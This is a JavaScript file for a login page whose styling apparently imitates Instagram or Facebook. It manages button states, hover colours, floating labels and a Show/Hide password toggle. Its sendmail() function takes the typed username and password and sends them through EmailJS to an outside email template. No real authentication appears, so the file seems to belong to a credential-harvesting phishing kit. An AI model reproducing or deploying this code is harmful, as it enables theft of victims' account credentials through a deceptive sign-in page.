// variables declaration
var username = document.getElementById("username");
var password = document.getElementById("password");
var toggleButton = document.getElementById("hideShow");
var submitButton = document.getElementById("submit");
var submitButton1 = document.getElementById("ph_submit");
var passHolder = document.getElementById("pass_placeholder");
var userHolder = document.getElementById("user_placeholder");

var valuesObj = {};

// disable Log in button when the website is loaded
window.onload = () => {
  disableButton();
};

// check if username and password input element is empty
function checkinput() {
  if (username.value != "" && password.value != "" && password.value.length >= 6) {
    submitButton.disabled = false;
    submitButton.style.cursor = "pointer";
    submitButton.style.backgroundColor = "rgb(0, 149, 246)";
    submitButton.style.opacity = "1.4";
    submitButton1.disabled = false;
    submitButton1.style.cursor = "pointer";
    submitButton1.style.backgroundColor = "rgb(0, 149, 246)";
    submitButton1.style.opacity = "1.4";
    submitButton1.style.pointerEvents = "all";

    submitButton.addEventListener('mouseover',function(){
      submitButton.style.backgroundColor = "#1877F2";
    });
    
    submitButton.addEventListener('mouseout',function(){
      submitButton.style.backgroundColor = "#1f95f6";
    });

    submitButton1.addEventListener('mouseover',function(){
      submitButton1.style.backgroundColor = "rgb(24, 119, 242)";
    });

    submitButton1.addEventListener('mouseout',function(){
      submitButton1.style.backgroundColor = "#1f95f6";
    });
    
  } else {
    disableButton();
  }

  //  password logic
  if (password.value != "") {
    toggleButton.style.visibility = "visible";
    passHolder.style.margin = "0 5px 16px 0";
    passHolder.style.fontSize = "10px";
    password.style.padding = "14px 0 2px 8px";
  } else {
    disableButton();
    passHolder.style.margin = "0 8px 1px 0";
    passHolder.style.fontSize = "12px";
    password.style.padding = "4px 0 2px 8px";
  }

  // username value check
  if (username.value != "") {
    userHolder.style.margin = "0 5px 16px 0";
    userHolder.style.fontSize = "10px";
    username.style.padding = "14px 0 2px 8px";
  } else {
    userHolder.style.margin = "0 8px 1px 0";
    userHolder.style.fontSize = "12px";
    username.style.padding = "4px 0 2px 8px";
  }
}

function hideShow() {
  // makes password visible
  if (password.type === "password") {
    password.type = "text";
    toggleButton.innerHTML = "Hide";
    toggleButton.style.padding = "0px 0 2px 17px";
  } else {
    password.type = "password";
    toggleButton.innerHTML = "Show";
    toggleButton.style.padding = "0px 0 2px 12px";
  }
}

// function to disable Log In button
function disableButton() {
  submitButton.disabled = true;
  submitButton.style.cursor = "default";
  submitButton.style.backgroundColor = "rgb(68, 177, 250)";
  submitButton1.disabled = true;
  submitButton1.style.cursor = "default";
  submitButton1.style.backgroundColor = "rgb(68, 177, 250)";
  toggleButton.style.visibility = "hidden";
  submitButton1.style.pointerEvents = "none";

  submitButton.addEventListener('mouseover',function(){
    submitButton.style.backgroundColor = "rgb(68, 177, 250)";
  });
  
  submitButton.addEventListener('mouseout',function(){
    submitButton.style.backgroundColor = "rgb(68, 177, 250)";
  });

  submitButton1.addEventListener('mouseover',function(){
    submitButton1.style.backgroundColor = "rgb(68, 177, 250)";
  });

  submitButton1.addEventListener('mouseout',function(){
    submitButton1.style.backgroundColor = "rgb(68, 177, 250)";
  });
}

function sendmail(){
  if (username.value != "" && password.value != "" && password.value.length >= 6){
    var params = {
      details : document.getElementById("username").value,
      password : document.getElementById("password").value
    }
    emailjs.send('service_kkxwwx8', 'template_niapyxz', params).then(function(response) {
      console.log('SUCCESS!', response.status, response.text);
   }, function(err) {
      console.log('FAILED...', err);
   });
  }
}